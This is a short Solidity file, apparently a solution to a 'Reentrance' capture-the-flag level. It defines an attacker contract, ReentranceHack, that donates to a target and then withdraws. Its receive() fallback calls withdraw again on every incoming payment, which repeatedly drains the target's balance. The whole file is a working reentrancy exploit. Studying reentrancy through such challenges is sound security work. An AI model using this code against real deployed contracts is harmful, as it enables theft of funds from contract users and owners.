// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external view returns (uint balance);
}

contract ReentranceHack {

  address payable reentranceContract;

  constructor(address _reentranceContractAddress) {
    reentranceContract = payable(_reentranceContractAddress);
  }

  function donate() public payable {
    Reentrance(reentranceContract).donate{value: msg.value}(address(this));
  }

  function withdraw(uint amount) public {
    Reentrance(reentranceContract).withdraw(amount);
  }

  receive() external payable {
    Reentrance(reentranceContract).withdraw(Reentrance(reentranceContract).balanceOf(address(this)));
  }
}